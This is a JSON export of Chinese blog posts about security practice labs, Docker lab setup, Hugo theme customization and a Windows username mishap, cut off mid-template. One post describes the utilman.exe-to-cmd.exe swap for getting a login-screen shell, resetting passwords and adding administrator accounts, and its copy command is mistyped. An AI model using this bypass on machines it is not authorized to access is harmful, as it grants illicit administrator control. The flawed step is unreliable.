[{"content":"先欠着\n","date":"2024-09-29T19:41:57+08:00","permalink":"https://hack.liagu-one.top/p/stack%E7%B2%BE%E8%AE%B2/","title":"Stack精讲"},{"content":"考研复习闲来无事想整一下blog\n更改了一下头像和favicon，特别是头像那里，在配置文件里面的url路径我写成了./images/avatar.jpg直接给我整成jpg了，在首页可以显示头像，在文章里面显示不了，于是复制文章里面的图片地址就知道了，tnnd多了一个. favicon就这个我觉得还挺好看，LG嘿嘿嘿 原本一直犹豫图床的问题，怕第三方小厂的不稳定，好点的又要付费，github上面也是，gitee之前还整理一个防图床防盗链，真继而难受，想来想去，blog尽量少用图片吧。（中间还想试试套个cdn，听说cloudfare免费不太行，付费整了2一会差点给github pages整没了，想了想算了，浪费半天呜呜呜） ","date":"2024-09-27T20:55:01+08:00","permalink":"https://hack.liagu-one.top/p/%E5%B0%8F%E6%8F%92%E6%9B%B2/","title":"小插曲"},{"content":"安装完docker和docker-compose up -d\n使用 Docker 和 Docker Compose 搭建靶场时，以下是一些常用的命令和步骤，帮助你拉取镜像、指定端口访问、查看当前的镜像以及关闭所有开启的镜像等操作。\n1. 拉取镜像 使用 docker pull 命令拉取靶场镜像。例如：\n1 docker pull 镜像名 如果你有具体的靶场镜像，比如 Metasploitable，命令会是：\n1 docker pull tleemcjr/metasploitable2 2. 使用 docker-compose 启动靶场并指定端口 首先创建一个 docker-compose.yml 文件，内容示例如下：\n1 2 3 4 5 6 7 version: \u0026#39;3\u0026#39; services: web: image: 镜像名 ports: - \u0026#34;主机端口:容器端口\u0026#34; restart: always 例如，如果你使用 vulnerable-web 镜像，并希望将主机的 8080 端口映射到容器的 80 端口：\n1 2 3 4 5 6 7 version: \u0026#39;3\u0026#39; services: vulnerable-web: image: vulnerables/web ports: - \u0026#34;8080:80\u0026#34; restart: always 使用 docker-compose up -d 启动服务：\n1 docker-compose up -d 3. 查看当前所有镜像 使用 docker images 命令查看已拉取的所有镜像：\n1 docker images 4. 查看正在运行的容器 使用 docker ps 命令查看所有正在运行的容器：\n1 docker ps 5. 关闭所有开启的容器 使用 docker stop 命令关闭所有正在运行的容器：\n1 docker stop $(docker ps -q) 6. 删除所有容器 使用 docker rm 删除所有容器（注意在删除前需要先停止它们）：\n1 docker rm $(docker ps -aq) 7. 删除所有镜像 如果需要删除所有镜像，使用以下命令（操作需谨慎）：\n1 docker rmi $(docker images -q) 8. 查看容器日志 可以使用以下命令查看容器的日志，帮助调试：\n1 docker logs 容器ID或容器名 ","date":"2024-09-12T13:56:12+08:00","permalink":"https://hack.liagu-one.top/p/docker%E7%94%A8%E6%B3%95/","title":"Docker用法"},{"content":"写给新手朋友入门，有了靶场丰富自己思路，也巩固自己的技术。当然新手老手都可以玩玩。\n这期盘点渗透靶场，排名不分前后，还有其他靶场欢迎留言提出！以及在留言当中评论出你最喜欢的靶场并附上理由。\n本期是盘点入门必刷，后期会盘点圈内所有的靶场以及靶场的writeup.\n1、DVWA 安全入门必刷靶场，很多新手朋友第一个选择的靶场就是DVWA，DVWA 一共包含了十个攻击模块，分别是：Brute Force（暴力破））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，并且有低中高等级 循序渐进渗透测试学习。\n2、vulnhub 很多安全竞赛都有在这里面出题，系列非常之多，不仅仅有web方面的，也有系统方面的渗透。\n网上也有很多writeup，环境直接下载虚拟机压缩包，解压即可使用。新手朋友建议下载先自行测试，然后再看writeup解题\nhttps://vulhub.org/（在线版）\nhttps://github.com/vulhub/vulhub（离线版）\n3、pikachu 也是类似dvwa的靶场，带有常见的web安全漏洞\nhttps://github.com/zhuifengshaonianhanlu/pikachu\n4、VulnStack vulnstack是红日旗下的一个开源靶场平台，模拟国内企业环境，涵盖CMS、漏洞管理、域管理等，以ATT\u0026amp;CK红队评估模式为设计思路，提供全方位的攻防训练体验。从环境搭建到漏洞利用、内网搜集、持久控制等。\nhttp://vulnstack.qiyuanxuetang.net/vuln/\n5、vulhub 跟vulnhub名字很像，但是这个是属于web类，直接docker安装，一个基于docker和docker-compose的漏洞环境集合，一条语句即可启动一个全新的漏洞环境，非常方便。\nhttps://vulhub.org/\n6、upload-labs、xss-labs、sqli-labs 听名字就知道了，这些靶场分别专注于文件上传、xss、sql注入漏洞三个靶场\nhttps://github.com/c0ny1/upload-labs\nhttps://github.com/do0dl3/xss-labs\nhttps://github.com/Audi-1/sqli-labs\n7、hack the box 是国外的一个网络安全在线靶场，靶场中被细分成若干种类，涵盖Web、病毒分析、密码学、逆向工程等领域。这些类别下各自拥有从基础到高阶的多个挑战项目，确保不同技能水平的用户都能找到匹配自身技术与知识水平的挑战进行尝试。\nhttps://www.hackthebox.com/\n8、墨者靶场 在线的靶场，无需搭建，直接注册账号后就可进行测试。不过有积分限制。\nhttps://www.mozhe.cn/bug\n9、vulfocus 白帽汇推出的一款漏洞集成平台，常见的fofa就是白帽汇的旗下的，内也有ctf。\nhttps://vulfocus.cn/\n","date":"2024-09-10T21:37:08+08:00","permalink":"https://hack.liagu-one.top/p/%E6%B8%97%E9%80%8F%E5%BF%85%E5%88%B7%E9%9D%B6%E5%9C%BA/","title":"渗透必刷靶场"},{"content":"靶场搭建平台 1、vulstudy https://github.com/c0ny1/vulstudy\n2、vulfocus Vulfocus 官网： Document 在线演示： http://vulfocus.fofa.so/\n3、vulnrange https://github.com/wgpsec/VulnRange\n漏洞集合 1、vulnhub https://www.vulnhub.com\n2、vulhub Vulhub - Docker-Compose file for vulnerability environment\n3、vulnrange https://github.com/wgpsec/VulnRange\n4、vulapps VulApps\n18、Iot-vulhub 固件漏洞复现环境 https://github.com/firmianay/IoT-vulhub\n在线靶场 在线靶场挑战 https://www.hackthebox.com\nBUUCTF在线评测 https://buuoj.cn\n韩国Webhacking https://webhacking.kr\n重生信息安全在线靶场： https://bc.csxa.cn\n网络信息安全攻防学习平台： http://hackinglab.cn\n墨者学院在线靶场： 在线靶场_墨者学院\n封神台在线演练靶场： 封神台 - 掌控安全在线攻防演练靶场，一个专为网络安全从业人员设计的白帽黑客渗透测试演练平台。\n安鸾渗透实战平台： 武汉安鸾学院 – 武汉网络安全培训-渗透测试培训-Web安全培训\nU2安全巡航靶场： http://scan.vulspace.com\nMS08067实战型训练平台： http://bachang.ms08067.com\nAWVS的测试站点 http: //vulnweb.com\npentesterlab渗透测试在线练习 PentesterLab: Our exercises\n综合漏洞靶场 http: //www.wechall.net/challs\n常见web安全实验靶场市场 https://github.com/bkimminich/juice-shop\n四、本地漏洞靶场 DVWA： http://www.dvwa.co.uk\nBWVS： https://github.com/bugku/BWVS\nBWAPP：小蜜蜂 bWAPP download | SourceForge.net\n4.pikachu https: //github.com/zhuifengshaonianhanlu/pikachu\n5.OWASP Mutillidae： Best Open Source Mac Software 2022\nVulnStack：内网靶场 漏洞信息 writeup文章：https://github.com/niudaii/my-vulstack-wp\njava训练靶场 https://github.com/tangxiaofeng7/SecExample https://github.com/l4yn3/micro_service_seclab https://github.com/j3ers3/Hello-Java-Sec\n审计代码 https://github.com/JoyChou93/java-sec-code\nwebgoat （java代码） https: //github.com/WebGoat/WebGoat https://github.com/WebGoat/WebGoat-Legacy\n适用于ios应用程序测试和安全性的学习工具 https://github.com/OWASP/igoat https://github.com/prateek147/DVIA-v2\npython2的常见漏洞靶场（python2） https://github.com/stamparm/DSVW\nphp反序列化靶场 https://github.com/fine-1/php-SER-libs 单独类型靶场：\nSqli-Labs：（sql注入靶场） https://github.com/Audi-1/sqli-labs\nUpload-labs： https://github.com/c0ny1/upload-labs\nXSS Challenges： http://xss-quiz.int21h.jp https://github.com/moeinfatehi/xss_vulnerability_challenges\nLFI-labs 和本地文件包后漏洞利用靶场 https://github.com/paralax/lfi-labs https://github.com/Go0s/LFIboomCTF\nSSRF类 https://github.com/cujanovic/SSRF-Testing https://github.com/sqlsec/ssrf-vuls\nXXE-lab https://github.com/c0ny1/xxe-lab\nMetasploitable： https://github.com/rapid7/metasploitable3\n提权类靶场 Lin.security – practise your Linux privilege escalation foo - In.security\nAD域环境的搭建、渗透、防护 https://github.com/chryzsh/DarthSidious\n","date":"2024-09-10T21:31:35+08:00","permalink":"https://hack.liagu-one.top/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA%E6%B1%87%E6%80%BB/","title":"渗透测试练习靶场汇总"},{"content":"一直是中文用户名，想改英文 用户名，闲来无事就搜一下改英文，但是。。。\nnetplwiz命令修改用户名大坑，中文用户的我就这样修改然后重启了直接gg了，重启界面还是中文，密码也不对，猜测可能是系统 已经将用户名更改，但是登录界面还是验证中文用户名密码。大坑！！！\n尝试修改密码 （忘记密码的兄弟且不是中文用户名的可以试试）\n关机进入高级选项-\u0026gt;疑难解答-\u0026gt;高级选项-\u0026gt;命令提示符\n一般windows11直接可以进，不用输入密码\n输入命令\n1 2 3 copy C:\\windows\\system32\\utilman.exe C:\\windows\\system32\\utilman.exebak copy C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\util.exe 然后关闭命令行点击继续按钮，开机右下角的小人，点击它进入命令行\n输入\n1 2 3 net localgroup administrators //可以查看当前用户名，除了adminstrator的另一个 net user 用户名 * //修改密码，输入两次，命令行没有显示但是已经输入，完成后回车 重启即好\n但是我还是失败了\n尝试创建用户 总之还是登录不进去，尝试再重新创建中文用户\n1 2 3 net user 用户名 密码 /add net localgroup administrrators 用户名 /add 登录是进去 了，结果是新用户，以为从头开始，结果是之前用户文件都在，就是桌面变了，麻了麻了 总归进去了，有管理员权限，就是看着怪怪的，而且每次管理员权限要再输入一次密码。\n成功修改 既然新建这个用户之前的肯定可以切换\n再次输入netplwiz命令查看用户，确实多了一个用户，将那个用户改成管理员组。那么那个就是之前更改 用户名的用户，想办法切换用户身份，重启就可以选择了。\n","date":"2024-08-29T16:31:56+08:00","permalink":"https://hack.liagu-one.top/p/windows%E7%94%A8%E6%88%B7%E5%90%8D%E9%97%AE%E9%A2%98/","title":"Windows用户名问题"},{"content":"短代码以及stack配置学习他，真不错\n小玩意 复制按钮 在 /assets/ts/custom.ts 中加入以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // 显示语言和复制按钮 const highlights = document.querySelectorAll(\u0026#39;.article-content div.highlight\u0026#39;); const copyText = `📄拷贝`, copiedText = `已拷贝!`; highlights.forEach(highlight =\u0026gt; { const copyButton = document.createElement(\u0026#39;button\u0026#39;); copyButton.innerHTML = copyText; copyButton.classList.add(\u0026#39;copyCodeButton\u0026#39;); highlight.appendChild(copyButton); const codeBlock = highlight.querySelector(\u0026#39;code[data-lang]\u0026#39;); // 获取语言 const lang = codeBlock.getAttribute(\u0026#39;data-lang\u0026#39;); if (!codeBlock) return; copyButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { navigator.clipboard.writeText(codeBlock.textContent) .then(() =\u0026gt; { copyButton.textContent = copiedText; setTimeout(() =\u0026gt; { copyButton.textContent = copyText; }, 1000); }) .catch(err =\u0026gt; { alert(err) console.log(\u0026#39;Something went wrong\u0026#39;, err); }); }); // Add language code button const languageButton = document.createElement(\u0026#39;button\u0026#39;); languageButton.innerHTML = lang.toUpperCase()+\u0026#39;\u0026amp;nbsp;\u0026amp;nbsp;\u0026#39;; languageButton.classList.add(\u0026#39;languageCodeButton\u0026#39;); highlight.appendChild(languageButton); }); new StackColorScheme(document.getElementById(\u0026#39;dark-mode-toggle\u0026#39;)); 在 /assets/scss/custom.scss 中加入以下代码（可按需自行修改）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //代码复制按钮 .article-content .copyCodeButton { position: absolute; top: 10px; right: 18px; border-radius: 12px; opacity: 1; color: #ffffffad; background: none; border: none; padding: 0; font-weight: 500; } .article-content .languageCodeButton { 添加站点统计信息与 i18n 期望展示格式：\n中文：\n本博客已稳定运行 x 天 y 小时 z 分钟 共发表 x 篇文章・总计 y k 字 本站总访问量 x 次 英文：\nThis blog has been running stably for x day, y hours and z minutes Published x articles in total · totaling y k words The total number of visits to this site is x times 其中访问量使用不蒜子实现\n在根目录/layouts/partials/footer/footer.html 文件内添加如下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;section class=\u0026#34;count_info\u0026#34;\u0026gt; \u0026lt;div\u0026gt; {{ T \u0026#34;footer.runtime1\u0026#34; }} \u0026lt;span id=\u0026#34;ds\u0026#34; class=\u0026#34;running-days\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; {{ T \u0026#34;footer.runtime2\u0026#34; }} \u0026lt;span id=\u0026#34;hs\u0026#34; class=\u0026#34;running-days\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; {{ T \u0026#34;footer.runtime3\u0026#34; }} \u0026lt;span id=\u0026#34;ms\u0026#34; class=\u0026#34;running-days\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; {{ T \u0026#34;footer.runtime4\u0026#34; }} \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; {{$scratch := newScratch}} {{ range (where .Site.Pages \u0026#34;Kind\u0026#34; \u0026#34;page\u0026#34; )}} {{$scratch.Add \u0026#34;total\u0026#34; .WordCount}} {{ end }} {{ T \u0026#34;footer.count1\u0026#34; }} {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;post\u0026#34;) }} {{ T \u0026#34;footer.count2\u0026#34; }} {{ div ($scratch.Get \u0026#34;total\u0026#34;) 1000.0 | lang.FormatNumber 2 }} k {{ T \u0026#34;footer.count3\u0026#34; }} \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;span id=\u0026#34;busuanzi_container_site_pv\u0026#34;\u0026gt;{{ T \u0026#34;footer.pv1\u0026#34; }}\u0026lt;span id=\u0026#34;busuanzi_value_site_pv\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;{{ T \u0026#34;footer.pv2\u0026#34; }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- Add blog running time --\u0026gt; \u0026lt;script\u0026gt; let s1 = \u0026#39;2023-6-18\u0026#39;; //website start date s1 = new Date(s1.replace(/-/g, \u0026#34;/\u0026#34;)); let s2 = new Date(); let timeDifference = s2.getTime() - s1.getTime(); let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24)); let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)); let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60)); document.getElementById(\u0026#39;ds\u0026#39;).innerHTML = days; document.getElementById(\u0026#39;hs\u0026#39;).innerHTML = hours; document.getElementById(\u0026#39;ms\u0026#39;).innerHTML = minutes; \u0026lt;/script\u0026gt; 在主题目录/i18n 下找到对应语言的文件，在属性 footer 下添加相应字段，结果如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 footer: # 本博客已稳定运行1天2小时3分钟 runtime1: other: 本博客已稳定运行 runtime2: other: 天 runtime3: other: 小时 runtime4: other: 分钟 # 共发表x篇文章，总计y k字 count1: other: 共发表 count2: other: 篇文章 · 总计 count3: other: 字 # 本站总访问量X次 pv1: other: 本站总访问量 pv2: other: 次 图标 / 自定义菜单 Stack 主题默认提供了图标支持 —Tabler Icons 选择自己想引用的图标，Stroke 调至 0.5px, 单击图标即可复制，之后在 assets/icons 中新建 \u0026ldquo;.svg\u0026rdquo; 文件即可调用。 如自定义左边栏菜单为例，在 config.toml/.yaml 中，可在 170 行中找到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ### Custom menu ### See https://docs.stack.jimmycai.com/configuration/custom-menu.html ### To remove about, archive and search page menu item, remove `menu` field from their FrontMatter menu: main: - identifier: Music name: Music url: https://music.shimoko.com/ weight: -30 params: icon: music newTab: true - identifier: status name: 监控 url: https://status.shimoko.com/status/shimoko weight: -20 params: icon: server newTab: true 修改鼠标选中颜色 修改主题里面/assets/scss/custom.scss\n1 2 3 4 5 //修改选中颜色 ::selection { color: #fff; background: #34495e; } 加载进度条 1 2 3 4 5 6 7 8 9 \u0026lt;script src=\u0026#34;https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; /\u0026gt; \u0026lt;script\u0026gt; NProgress.start(); document.addEventListener(\u0026#34;readystatechange\u0026#34;, () =\u0026gt; { if (document.readyState === \u0026#34;interactive\u0026#34;) NProgress.inc(0.8); if (document.readyState === \u0026#34;complete\u0026#34;) NProgress.done(); }); \u0026lt;/script\u0026gt; 归档 双栏 在 /assets/scss/custom.scss 中加入以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 归档页面两栏 @media (min-width: 1024px) { .article-list--compact { display: grid; grid-template-columns: 1fr 1fr; background: none; box-shadow: none; gap: 1rem; article { background: var(--card-background); border: none; box-shadow: var(--shadow-l2); margin-bottom: 8px; border-radius: 16px; } } } 首页欢迎横幅 在 /layouts/index.html 的 \u0026lt;section class=\u0026quot;article-list\u0026quot;\u0026gt; 前添加以下代码：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- 首页欢迎字幅 --\u0026gt; \u0026lt;div class=\u0026#34;welcome\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;font-size: 2rem; text-align: center; font-weight: bold\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;shake\u0026#34;\u0026gt;👋\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text1\u0026#34; \u0026gt; Welcome\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text2\u0026#34;\u0026gt; To \u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text3\u0026#34; style=\u0026#34;color:#e99312\u0026#34;\u0026gt;Xa\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text4\u0026#34; style=\u0026#34;color:#e99312\u0026#34;\u0026gt;l\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text5\u0026#34; style=\u0026#34;color:#e99312\u0026#34;\u0026gt;a\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text6\u0026#34; style=\u0026#34;color:#e99312\u0026#34;\u0026gt;o\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text7\u0026#34; style=\u0026#34;color:#e99312\u0026#34;\u0026gt;k\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text8\u0026#34; style=\u0026#34;color:#e99312\u0026#34;\u0026gt;\u0026#39;s\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text9\u0026#34; style=\u0026#34;color:#e99312\u0026#34;\u0026gt;Blog\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 首页欢迎字幅 --\u0026gt; 在 /assets/scss/custom.scss 中加入以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 //首页欢迎板块样式 .welcome { color: var(--card-text-color-main); background: var(--card-background); box-shadow: var(--shadow-l2); border-radius: 30px; display: inline-block; } // 👋emoji实现摆动效果 .shake { display: inline-block; animation: shake 1s; animation-duration: 1s; animation-timing-function: ease; animation-delay: 0s; animation-iteration-count: 1; animation-direction: normal; animation-fill-mode: none; animation-play-state: running; animation-name: shake; animation-timeline: auto; animation-range-start: normal; animation-range-end: normal; animation-delay: 2s; @keyframes shake { 0% { transform: rotate(0); } 25% { transform: rotate(45deg) scale(1.2); } 50% { transform: rotate(0) scale(1.2); } 75% { transform: rotate(45deg) scale(1.2); } 100% { transform: rotate(0); } } } // 实现字符跳动动画 .jump-text1 { display: inline-block; animation: jump 0.5s 1; } .jump-text2 { display: inline-block; animation: jump 0.5s 1; animation-delay: 0.1s; } .jump-text3 { display: inline-block; animation: jump 0.5s 1; animation-delay: 0.2s; } .jump-text4 { display: inline-block; animation: jump 0.5s 1; animation-delay: 0.3s; } .jump-text5 { display: inline-block; animation: jump 0.5s 1; animation-delay: 0.4s; } .jump-text6 { display: inline-block; animation: jump 0.5s 1; animation-delay: 0.5s; } .jump-text7 { display: inline-block; animation: jump 0.5s 1; animation-delay: 0.6s; } .jump-text8 { display: inline-block; animation: jump 0.5s 1; animation-delay: 0.7s; } .jump-text9 { display: inline-block; animation: jump 0.5s 1; animation-delay: 0.9s; } @keyframes jump { 0% { transform: translateY(0); } 50% { transform: translateY(-20px); } 100% { transform: translateY(0); } } 头像旋转 在 /assets/scss/custom.scss 中加入以下代码：\n1 2 3 4 5 6 7 8 // 头像旋转动画 .sidebar header .site-avatar .site-logo { transition: transform 1.65s ease-in-out; // 旋转时间 } .sidebar header .site-avatar .site-logo:hover { transform: rotate(360deg); // 旋转角度为360度 } 博客产量 laouts/index.html和上面欢迎横幅在同一个div\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 \u0026lt;div id=\u0026#34;heatmap\u0026#34; style=\u0026#34; max-width: 600px; height: 180px; padding: 2px; text-align: center; margin: auto\u0026#34; \u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://npm.elemecdn.com/echarts@5.3.0/dist/echarts.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var chartDom = document.getElementById(\u0026#39;heatmap\u0026#39;); var myChart = echarts.init(chartDom); window.onresize = function() { myChart.resize(); }; var option; // echart heatmap data seems to only support two elements tuple // it doesn\u0026#39;t render when each item has 3 value // it also only pass first 2 elements when reading event param // so here we build a map to store additional metadata like link and title // map format {date: [{wordcount, link, title}]} // for more information see https://blog.douchi.space/hugo-blog-heatmap var dataMap = new Map(); {{ range ((where .Site.RegularPages \u0026#34;Type\u0026#34; \u0026#34;post\u0026#34;)) }} var key = {{ .Date.Format \u0026#34;2006-01-02\u0026#34; }}; var value = dataMap.get(key); var wordCount = {{ .WordCount }}; var link = {{ .RelPermalink}}; var title = {{ .Title }}; // multiple posts in same day if (value == null) { dataMap.set(key, [{wordCount, link, title}]); } else { value.push({wordCount, link, title}); } {{- end -}} var data = []; // sum up the word count for (const [key, value] of dataMap.entries()) { var sum = 0; for (const v of value) { sum += v.wordCount; } data.push([key, (sum / 1000).toFixed(1)]); } var startDate = new Date(); var year_Mill = startDate.setFullYear((startDate.getFullYear() - 1)); var startDate = +new Date(year_Mill); var endDate = +new Date(); var dayTime = 3600 * 24 * 1000; startDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, startDate); endDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, endDate); // change date range according to months we want to render function heatmap_width(months){ var startDate = new Date(); var mill = startDate.setMonth((startDate.getMonth() - months)); var endDate = +new Date(); startDate = +new Date(mill); endDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, endDate); startDate = echarts.format.formatTime(\u0026#39;yyyy-MM-dd\u0026#39;, startDate); var showmonth = []; showmonth.push([ startDate, endDate ]); return showmonth }; function getRangeArr() { const windowWidth = window.innerWidth; if (windowWidth \u0026gt;= 600) { return heatmap_width(12); } else if (windowWidth \u0026gt;= 400) { return heatmap_width(9); } else { return heatmap_width(6); } } option = { title: { top: 0, left: \u0026#39;center\u0026#39;, text: \u0026#39;博客废话产量\u0026#39; }, tooltip: { hideDelay: 1000, enterable: true, formatter: function (p) { const date = p.data[0]; const posts = dataMap.get(date); var content = `${date}`; for (const [i, post] of posts.entries()) { content += \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; var link = post.link; var title = post.title; var wordCount = (post.wordCount / 1000).toFixed(1); content += `\u0026lt;a href=\u0026#34;${link}\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;${title} | ${wordCount} 千字\u0026lt;/a\u0026gt;` } return content; } }, visualMap: { min: 0, max: 10, type: \u0026#39;piecewise\u0026#39;, orient: \u0026#39;horizontal\u0026#39;, left: \u0026#39;center\u0026#39;, top: 30, inRange: { // [floor color, ceiling color] color: [\u0026#39;#7aa8744c\u0026#39;, \u0026#39;#7AA874\u0026#39; ] }, splitNumber: 4, text: [\u0026#39;千字\u0026#39;, \u0026#39;\u0026#39;], showLabel: true, itemGap: 20, }, calendar: { top: 80, left: 20, right: 4, cellSize: [\u0026#39;auto\u0026#39;, 12], range: getRangeArr(), itemStyle: { color: \u0026#39;#F1F1F1\u0026#39;, borderWidth: 2.5, borderColor: \u0026#39;#fff\u0026#39;, }, yearLabel: { show: false }, // the splitline between months. set to transparent for now. splitLine: { lineStyle: { color: \u0026#39;rgba(0, 0, 0, 0.0)\u0026#39;, // shadowColor: \u0026#39;rgba(0, 0, 0, 0.5)\u0026#39;, // shadowBlur: 5, // width: 0.5, // type: \u0026#39;dashed\u0026#39;, } } }, series: { type: \u0026#39;heatmap\u0026#39;, coordinateSystem: \u0026#39;calendar\u0026#39;, data: data, } }; myChart.setOption(option); myChart.on(\u0026#39;click\u0026#39;, function(params) { if (params.componentType === \u0026#39;series\u0026#39;) { // open the first post on the day const post = dataMap.get(params.data[0])[0]; const link = window.location.origin + post.link; window.open(link, \u0026#39;_blank\u0026#39;).focus(); } }); \u0026lt;/script\u0026gt; 已写完了哪本书？ 当然可以改成别的样式\n将以下代码添加到 footer.html：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 {{$scratch := newScratch}} {{ range (where .Site.Pages \u0026#34;Kind\u0026#34; \u0026#34;page\u0026#34; )}} {{$scratch.Add \u0026#34;total\u0026#34; .WordCount}} {{ end }} {{$totalWord := $scratch.Get \u0026#34;total\u0026#34; }} {{ $wowWord := div $totalWord 10000}} {{ $wowBook := \u0026#34;还在努力更新中..\u0026lt;/br\u0026gt;加油！加油啦！\u0026#34;}} {{ if ge $wowWord 40 }}{{$wowBook = \u0026#34;写完一本我国著名的\u0026lt;/br\u0026gt;四大名著了！\u0026#34;}} {{ else if ge $wowWord 35 }}{{$wowBook = \u0026#34;写完一本 东野圭吾 的\u0026lt;/br\u0026gt;《白夜行》了！\u0026#34;}} {{ else if ge $wowWord 34 }}{{$wowBook = \u0026#34;写完一本 雨果 的\u0026lt;/br\u0026gt;《巴黎圣母院》了！\u0026#34;}} {{ else if ge $wowWord 32 }}{{$wowBook = \u0026#34;写完一本 艾米莉·勃朗特 的\u0026lt;/br\u0026gt;《呼啸山庄》了！\u0026#34;}} {{ else if ge $wowWord 31 }}{{$wowBook = \u0026#34;写完一本 阿来 的\u0026lt;/br\u0026gt;《尘埃落定》了！\u0026#34;}} {{ else if ge $wowWord 30 }}{{$wowBook = \u0026#34;写完一本 茅盾 的\u0026lt;/br\u0026gt;《子夜》了！\u0026#34;}} {{ else if ge $wowWord 28 }}{{$wowBook = \u0026#34;写完一本 张炜 的\u0026lt;/br\u0026gt;《古船》了！\u0026#34;}} {{ else if ge $wowWord 25 }}{{$wowBook = \u0026#34;写完一本 钱钟书 的\u0026lt;/br\u0026gt;《围城》了！\u0026#34;}} {{ else if ge $wowWord 23 }}{{$wowBook = \u0026#34;写完一本 简·奥斯汀 的\u0026lt;/br\u0026gt;《傲慢与偏见》了！\u0026#34;}} {{ else if ge $wowWord 22 }}{{$wowBook = \u0026#34;写完一本 莫泊桑 的\u0026lt;/br\u0026gt;《一生》了！\u0026#34;}} {{ else if ge $wowWord 21 }}{{$wowBook = \u0026#34;写完一本 东野圭吾 的\u0026lt;/br\u0026gt;《解忧杂货店》了！\u0026#34;}} {{ else if ge $wowWord 20 }}{{$wowBook = \u0026#34;写完一本 巴金 的\u0026lt;/br\u0026gt;《寒夜》了！\u0026#34;}} {{ else if ge $wowWord 19 }}{{$wowBook = \u0026#34;写完一本 亚米契斯 的\u0026lt;/br\u0026gt;《爱的教育》了！\u0026#34;}} {{ else if ge $wowWord 18 }}{{$wowBook = \u0026#34;写完一本 沈从文 的\u0026lt;/br\u0026gt;《边城》了！\u0026#34;}} {{ else if ge $wowWord 17 }}{{$wowBook = \u0026#34;写完一本 马克·吐温 